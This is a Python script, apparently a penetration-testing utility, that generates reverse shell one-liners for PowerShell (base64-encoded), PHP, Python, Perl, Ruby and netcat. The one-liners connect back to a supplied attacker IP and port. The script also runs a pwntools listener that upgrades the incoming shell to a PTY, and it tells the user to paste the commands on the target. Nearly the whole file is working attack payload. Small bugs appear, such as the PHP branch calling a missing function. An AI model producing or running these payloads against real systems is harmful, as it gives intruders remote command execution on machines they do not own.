#!/usr/bin/python3
import sys
import base64
import pwn
import argparse

#Help Menu
def help():
    parser = argparse.ArgumentParser(description='Reverse Shellcode Generator with interactive & PTY Listner \n\tby\n\t\tMr.r0b07')
    parser.add_argument('-i', dest='ip', action="store", required=True,help='Attacker Machine IP' )
    parser.add_argument('-p', dest='port', action="store",type=int, required=True,help='Attacker Port to Listen', default=4444 )
    parser.add_argument('-l', action="store_true",help='Start Listner Also' )
    parser.add_argument('-t', dest='target', action="store", required=False, help='Target Payload [ powershell || php || python || ruby || perl || netcat  ]', default="all" )
    global args
    args = parser.parse_args()

#Main class windows
class windows:
    #Powershell Reverse shell generator function
    def powershell():
        print("\n[*] powershell reverse Shell \n")
        payload = ('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
        payload = payload % (ip, port)
        cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
        print("\t"+cmdline+"\n")
#Main Class Linux
class linux:
    #php Reverse shell generator function

    def phpshell():
        print("\n[*] PHP reverse Shell \n")
        print('\tphp -r \'$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");\''%(ip,port));
    #Python Reverse shell generator function

    def pyshell():
        print("\n[*] python reverse Shell \n")
        print('\tpython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n'%(ip,port))
        print('\tpython3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n'%(ip,port))
    #Perl Reverse shell generator function

    def perlshell():
        print("\n[*] perl reverse Shell \n")
        print('\tperl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''%(ip,port))
    #Ruby Reverse shell generator function

    def gemshell():
        print("\n[*] Ruby reverse Shell \n")
        print('\truby -rsocket -e\'f=TCPSocket.open("'+ip+'",'+str(port)+').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'')
    #OldsChool [nc] Reverse shell generator function

    def nc():
        print("\n[*] netcat reverse Shell \n")
        print('\tnc -e /bin/sh %s %d\n \t\t\tOR\n'%(ip,port))
        print('\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f\n'%(ip,port))

#Main Clss Listner
class listner:
    #Interactive Listner (Partial)
    def interactive():
        lis = pwn.listen(port)
        lis.wait_for_connection()
        lis.sendline(b'whoami')
        lis.recvline()
        lis.interactive(prompt='')
    #TTY Interactive complete functioanlity shell
    def pty():
        lis = pwn.listen(port)
        lis.wait_for_connection()
        lis.sendline(b'whoami')
        lis.recvline()
        lis.sendline(b'python -c \'import pty; pty.spawn("/bin/sh")\'')
        lis.sendline(b'python3 -c \'import pty; pty.spawn("/bin/sh")\'')
        lis.sendline(b'export TERM=xterm')
        lis.interactive(prompt='')
#main Function
def main():
    print("Copy and paste below command to the target\n\n")
    if (target == "php"):
        if(args.l):
            linux.phpshell()
            listner.pty()
        else:
            linux.powershell()
    elif(target == "powershell"):
        if(args.l):
            windows.powershell()
            listner.interactive()
        else:
            windows.powershell()
    elif(target == "python"):
        if(args.l):
            linux.pyshell()
            listner.pty()
        else:
            linux.pyshell()
    elif(target == "perl"):
        if(args.l):
            linux.perlshell()
            listner.pty()
        else:
            linux.perlshell()
    elif(target == "ruby"):
        if(args.l):
            linux.gemshell()
            listner.pty()
        else:
            linux.gemshell()
    elif(target == "netcat"):
        if(args.l):
            linux.nc()
            listner.pty()
        else:
            linux.nc()
    elif(target == "all"):
        windows.powershell()
        linux.phpshell()
        linux.pyshell()
        linux.perlshell()
        linux.gemshell()
        linux.nc()
    else:
        sys.exit()

if __name__ == "__main__":
    help()
    ip = args.ip
    port = args.port
    target = args.target
    main()
    print("\nThanks For using this \n")
    
